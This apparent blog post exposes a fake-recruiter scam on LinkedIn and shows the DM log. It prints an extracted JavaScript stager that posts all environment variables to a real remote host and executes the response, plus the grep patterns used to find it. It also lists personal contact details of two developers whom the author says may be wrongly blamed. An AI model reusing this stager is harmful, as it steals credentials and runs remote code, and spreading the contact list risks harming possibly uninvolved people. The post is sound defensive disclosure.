---
title: Larry Bogie of BitAngels Investment Group
description: Demands code review that would lead to exploitation
layout: post
date: 2026-04-10 15:21 0000
time_to_live: 1800
tags: [ DM, LinkedIn, RAT, scam ]
image: assets/images/scammers/2026-04-10_Larry-Bogie-of-BitAngels-Investment-Group/LinkedIn-Header.png
# social_comment:
#   links:
#     - text: Blue Sky
#       href:
#       title: Link to thread for this post
#
#     - text: LinkedIn
#       href:
#       title: Link to LinkedIn thread for this post
#
#     - text: Mastodon
#       href:
#       title: Link to Toot thread for this post
#
#     - text: Twitter
#       href:
#       title: Link to Tweet thread for this post
---



This is apart of a ~~two~~ three part story, in no particular order, where
Larry and Barbosa, and now Bruce too, try to pop my box via very similar Oracle
JavaScript™ backend code.


______


## Contents


- [TLDR][heading__tldr]
  - [Exploit hunting tricks][heading__exploit_hunting_tricks]
  - [Threat actor contact details][heading__threat_actor_contact_details]
- [DM log][heading__dm_log]
<!-- - [Got something to say about that?](#heading__social_comment) -->


______


## TLDR
[heading__tldr]: #tldr


Is credential stealing and likely RAT stager, following are relevant code
snippets extracted from repository Larry repeatedly requested I run;

```javascript
//> app/controllers/settingController.js
const setApiKey = (s) => atob(s);

const verify = (api) => axios.post(api,{ ...process.env },{ headers: { "x-secret-header": "secret" } });
/* ... other BS ... */

//> app/controllers/frontController.js
const VERIFICATION_TOKEN = "aHR0cHM6Ly9sb2NhdGUtbXktaXAudmVyY2VsLmFwcC9hcGkvaXAtY2hlY2stZW5jcnlwdGVkLzNhZWIzNGEzMzM=";
//> https://locate-my-ip.vercel.app/api/ip-check-encrypted/3aeb34a333

async function validateApiKey() {
  verify(setApiKey(VERIFICATION_TOKEN))
    .then((response) => {
      const executor = new Function("require", response.data);
      executor(require);
      return true;
    })
    .catch((err) => {
      return false;
    });
}

const verified = validateApiKey();

if (!verified) {
  return;
}

/* ... other BS ... */
```

> Note for those that ain't savvy with Oracle's JavaScript™; above code
> deobfuscates `VERIFICATION_TOKEN` into a real URL, which is sent a POST
> request along with any tasty data stored in `process.env`, and the
> `response.data` is executed.
>
> Between 2026-04-10 17:16 and 17:20 messages these bits of code were extracted
> and understood for what they are, and everything beyond that point in
> [DMs log][heading__dm_log] was focused on what else Larry might let slip x-]

### Exploit hunting tricks
[heading__exploit_hunting_tricks]: #exploit-hunting-tricks

Nothing fancy was required, a little grep-ing about for common patterns;

```bash
grep -rinE '\b(atob|axios|fetch)\b'
#> ...
#> app/controllers/settingController.js:5:const setApiKey = (s) => atob(s);
#> app/controllers/settingController.js:6:const verify = (api) => axios.post(api,{ ...process.env },{ headers: { "x-secret-header": "secret" } });
#> ...
```

... and from there a quick check of what `verify` is _really_ doing;

```bash
grep -rinE '\b(verify)\b'
#> ...
#> app/controllers/frontController.js:601:  verify(setApiKey(VERIFICATION_TOKEN))
#> ...
```

Digging deeper exposes who _may_ be responsible for authoring these bits;

```bash
git blame main app/controllers/settingController.js
```

```yaml
author: zhongeric
commit:
  hash: 90466f90
  date: Sat Feb 14 12:00:00 2026 +0700
  message: Refactor logic in settingController.js
```

```bash
git blame main app/controllers/frontController.js
```

```yaml
author: nikkhielseath <sethnikhil74@gmail.com>
commit:
  hash: 1ce44d7f
  date: Sat Feb 21 12:00:00 2026 +0400
  message: Add tests in frontController.js
```

...  **note** I write "_may_ be", because faking Git commit data ain't too
difficult, so it ain't out of realm of possibility that false attributions
could be made by trusting Git log/blame results.

That all stated, as of 2026-04-17, it seems `nikkhielseath`/`SNikhill` is no
longer on GitHub.  So perhaps these threat actors are not monocle-levels of
sophisticated.

### Threat actor contact details
[heading__threat_actor_contact_details]: #threat-actor-contact-details

```yaml
Larry Bogie:
  email: pittszkwaitvx76hk@outlook.com
  linkedin:
    personal: https://www.linkedin.com/in/larry-bogie-63159a9/
    organization: https://www.linkedin.com/company/bitangels/
  github: https://github.com/BVSLab/blockchain-voting-system
  website: americangeneralfinance.com
  phone: 813-220-0782

zhongeric:
  name: Eric Zhong
  linkedin: https://www.linkedin.com/in/eric-zhong
  github: https://github.com/zhongeric
  email:
    - eric.zhong@uniswap.org
    - ezhong1900@gmail.com
  twitter:
    - https://twitter.com/ericzhong
    - https://twitter.com/_ericzhong
  ens: ezhong.eth
  website: https://ezhong.eth.limo

nikkhielseath:
  name: Nikkhiel Seath
  linkedin: https://linkedin.com/in/nikkhielseath
  email: sethnikhil74@gmail.com
  github: https://github.com/nikkhielseath
  blog: https://github.com/nikkhielseath/SNikhill
  dev.to: https://dev.to/snikhill
  gitlab: https://gitlab.com/SNikhill/
```

**Note** `Larry Bogie` is highly likely a ne're-do-well and apart of a larger
Org that makes its business through exploitation, where as some plausible
deniability/doubt could be cast on if `zhongeric` and/or `nikkhielseath` are at
all involved.

All of above info was publicly accessible.

Checking, and cross-checking, various sources leads me to believe Larry is a
real person.  However, I've doubts that the real Larry is who contacted me.


______


## DM log
[heading__dm_log]: #dm-log


What follows are messages exchanged via the LinkedIns, along with a few
editor's notes, but are otherwise unchanged other than some adjustment to
formatting and one redaction.

### 2026-04-10 15:21 -- Larry Bogie

> Hello, there.
>
> Thanks for connecting.
>
> We are currently developing a Web3 voting and governance platform and are
> looking for experienced senior DevSecOps engineer with a strong Web3
> background.
>
> Your background seems like a great match, and I’d love to connect to explore
> potential collaboration.
>
> Let me know if you’re available to work.
>
> Thanks.

### 2026-04-10 16:49 -- SOAndSO .eth (Digital Mercenary)

Near perfect timing Larry!

Sounds like it could be within my wheelhouse, and I can make a few minutes to
talk tech today

### 2026-04-10 16:55 -- Larry Bogie

> Hi! We’re part of BitAngels, a US-based network of blockchain investors and
> builders, and we’re currently working on CoinLocator — a Web3 governance
> platform focused on transparent, incentive-driven voting using staking and
> on-chain mechanisms.
>
> I came across your background and it looks like a strong fit — especially
> your experience in DevSecOps and blockchain infrastructure.
>
> We’re currently looking for a Blockchain DevSecOps Engineer to help us build
> and maintain secure, scalable infrastructure for the platform. The role
> involves setting up and managing CI/CD pipelines, securing smart contract
> deployment processes, monitoring systems, and ensuring best practices across
> cloud infrastructure and on-chain integrations.
>
> You’d work closely with our smart contract, backend, and frontend teams to
> improve reliability, automate workflows, and strengthen the overall security
> posture of the platform.
>
> We already have a solid team in place (CTO, engineers, design) and a working
> prototype. The collaboration is remote and flexible (part-time or contract to
> start).
>
> Would love to tell you more if this sounds interesting!

### 2026-04-10 17:06 -- SOAndSO .eth (Digital Mercenary)

Sounds almost too good to be true!  Slaying security bugs and taming CI/CD
pipelines is kinda my thing ;-)

I'll be available at → `https://meet.google.com/<REDACTED>` ← for the next few
minutes if ya got a moment to tell me more

```markdown
#### Editor's Note -- I use Vim BTW

And whenever someone em-dashes me in the DMs I get almost irrepressible urge to
insert special characters too!  And those little arrows are now muscle memory,
`<C-k>->` and `<C-k>-<` respectively, while in Insert Mode.

Check `:help digraphs` for more fun keyboard short-cuts (-;
```

### 2026-04-10 17:16 -- Larry Bogie

> Okay.  We’ve completed an initial working version of the product and are now
> focusing on staking contracts, backend logic, and improving the UI. Our goal
> is to ship an MVP and public beta within the next year.
>
> I’ll be coordinating with our CTO to schedule a technical interview to assess
> fit for the role and the project.
>
> Before the call, it would be helpful if you could take a look at the project
> to get a sense of the product.
>
> Here’s the repository: `https://github[.]com/BVSLab/blockchain-voting-system`
>
> This review evaluates the platform from a user journey, UI workflow, and
> product experience perspective, focusing on usability, conversion, and system
> feedback rather than code-level analysis.
>
> This helps us make the follow-up discussion more concrete and relevant to
> your background.
>
> After that, I’d be happy to arrange a short call with our CTO to walk through
> the details and answer any questions you may have.
>
> Looking forward to hearing your thoughts.

### 2026-04-10 17:20 -- Larry Bogie

> Our CTO is available for now, so no need for a deep dive — even a brief
> review to understand the flow and share any initial impressions or questions
> would be more than enough.
>
> Please just run the project and take a look at the current frontend UI and
> features and then ready to join the meeting.

### 2026-04-10 17:52 -- SOAndSO .eth (Digital Mercenary)

I did a quick skim of source code and have questions!  However, for anything
extensive/in-depth I must inform ya of two things;

0. Code reviews, are one of the free services I do not provide, here be a link
   to related FAQ section;
   https://www.digital-mercenaries.com/frequently-asked-questions.html#do-you-offer-free-services-such-as-bug-testing-or-code-reviews

1. Executing code as pre-condition for meetings, or for meetings themselves,
   violates publicly posted professional policies;
   https://www.digital-mercenaries.com/frequently-asked-questions.html#why-do-mercenaries-refuse-using-certain-applications-for-meetings

...  In other words, I'm happy to review code and provide professional opinions
based on decades of training, but not for free and not as pre-condition for
talking to decision makers

Tragically today's flex-time has been nearly consumed completely, so soonest we
can aim for for a quick chat will be next Monday

````markdown
#### Editor's Note -- `grep`-ing is good skill

For those that skipped/skimmed past "Exploit hunting tricks" section in this
post, here are the two commands I used between 2026-04-10 17:16 and 17:20
messages;

```bash
grep -rinE '\b(atob|axios|fetch)\b'
#> Above led me to look at `verify` function, which exposed credential stealing
#> and RAT staging stuff
grep -rinE '\b(verify)\b'
```

... it aktuhally took longer to write my response to Larry, than to find expose
Larry's attempts to pop my box :-\
````

### 2026-04-10 17:53 -- Larry Bogie

> Hi SOAndSO,
>
> Just to clarify, I don’t want this to feel like a take-home task or unpaid
> work at all. I only shared the repo as optional context so we can have a more
> meaningful conversation.
>
> Of course, if we do end up going deeper on technical feedback beyond a quick
> chat, we’re absolutely open to compensating that time as part of the
> engagement (The first month's salary and compensation for project review are
> combined and included in this contract.).

### 2026-04-10 21:28 -- SOAndSO .eth (Digital Mercenary)

Howdy Larry!

My feels got nothing to do with it, because policy is what it is to protect all
parties

I didn't spot any CI/CD related files, so I'm gonna guess ya need me to build
out everything for semi-automated testing, deployment, etc. Which ain't no
problem ;-)

But, before I go doing things that need not be done we gotta get admin stuff
sorted, which starts with a quick chat about exactly what the team needs of me

### 2026-04-11 02:28 -- Larry Bogie

> Hey — great point, and I agree we should align before going deeper.
>
> To give you a bit more context upfront:
>
> Right now we have a working prototype, but infrastructure is still quite
> early — deployments are mostly manual and we don’t yet have a full CI/CD
> pipeline in place.
>
> What we’re looking for is someone to help us set up and own that layer —
> things like CI/CD, secure smart contract deployment, environment setup
> (staging/prod), and overall infrastructure + monitoring best practices.
>
> In the short term, the focus would be getting us to a solid MVP-ready setup
> (reliable deployments, basic security, and visibility into the system).
>
> Let’s sync Monday.  Just run the project and see the current frontend.  What
> time works for you?

### 2026-04-11 02:48 -- SOAndSO .eth (Digital Mercenary)

> > Just run the project and see the current frontend.

Executing code as pre-condition for meetings, or for meetings themselves,
violates publicly posted professional policies, please review previous related
reply for link regarding specifically referenced policy that'd violate

> > Let’s sync Monday.
>
> > What time works for you?

16:30 UTC via g-meet link previously provided _should_ be fine so long as none
other lays claim to that time-slot before ya confirm it

> > reliable deployments, basic security, and visibility into the system

These are tasks I specialize in!...  though I've a tendency to go well beyond
basics ;-)

Regardless, 'ntil Monday I'll be wishing ya a wonderful weekend!

### 2026-04-13 15:46 -- SOAndSO .eth (Digital Mercenary)

Marvelous Monday morning Larry!

### 2026-04-13 16:41 -- Larry Bogie

> Hi SOAndSo
>
> Did you have a good weekend?

### 2026-04-13 16:51 -- SOAndSO .eth (Digital Mercenary)

Yup, was reasonably relaxed on my end. Hope yours let ya recharge for this week

How's the team feeling about talking nerdy?

### 2026-04-13 16:55 -- Larry Bogie

> Yeah, we can have a technical interview.
>
> However, have you ever checked the project on your local?
>
> Please just run the project and check how our project is working on your
> side.
>
> If everything is okay, we can schedule a technical interview.

### 2026-04-13 17:00 -- SOAndSO .eth (Digital Mercenary)

Do correct me if I be misremembering, because I thought I shared related policy
links;

0. Code reviews, are one of the free services I do not provide, here be a link
   to related FAQ section;
   https://www.digital-mercenaries.com/frequently-asked-questions.html#do-you-offer-free-services-such-as-bug-testing-or-code-reviews

1. Executing code as pre-condition for meetings, or for meetings themselves,
   violates publicly posted professional policies;
   https://www.digital-mercenaries.com/frequently-asked-questions.html#why-do-mercenaries-refuse-using-certain-applications-for-meetings

### 2026-04-13 17:02 -- Larry Bogie

> 1. It's not free service.
>
> we’re absolutely open to compensating that time as part of the engagement
> (The first month's salary and compensation for project review are combined
> and included in this contract.).
>
> 2. It would be helpful if you could take a look at the project to get a sense
>    of the product before the call.
>
> If it doesn't match for your working style, that's unfortunate.

### 2026-04-13 17:10 -- SOAndSO .eth (Digital Mercenary)

Ah, okay, sorry for having my shields-up so to speak x-]

... can never be too careful these days

In that case for new b2b/c2c contracted engagements a 50% deposit is required
before work starts, and for web3/DevSecOps related work I typically charge 30
Eth per-month

### 2026-04-13 17:12 -- Larry Bogie

> Okay, no problem
>
> Your salary is in line with senior-level roles.

```markdown
#### Editor's Note -- I am worth more than that

At time of messaging 1 Eth was being traded for about 2k worth of USD, so Larry
would be saying "Okay, no problem" to sending about 30k to some internet rando,
without any voice/video meeting(s) or contract(s)...

Super sus as the youngens may say, even were one to ignore the overt attempts
to exploit my system.

But, while I ain't one to ignore such attempts, I do like money and would be
willing to provide a scathing source-code review for that amount!
```

### 2026-04-13 17:23 -- SOAndSO .eth (Digital Mercenary)

Heh, that'd be because I'm able to satisfy senior/lead-level roles... and maybe
a bit more than that too ;-)

### 2026-04-13 17:31 -- Larry Bogie

> Sounds great.
>
> But I don't want to waste of our time.
>
> Can you check how project is working on you side after running first and join
> the meeting?

### 2026-04-13 17:40 -- SOAndSO .eth (Digital Mercenary)

Code reviews, are one of the free services I do not provide, here be a link to
related FAQ section;
https://www.digital-mercenaries.com/frequently-asked-questions.html#do-you-offer-free-services-such-as-bug-testing-or-code-reviews

Executing code as pre-condition for meetings, or for meetings themselves,
violates publicly posted professional policies;
https://www.digital-mercenaries.com/frequently-asked-questions.html#why-do-mercenaries-refuse-using-certain-applications-for-meetings

### 2026-04-13 17:49 -- Larry Bogie

> Don't waste of our time
>
> Have a great day
>
> Let's stop here

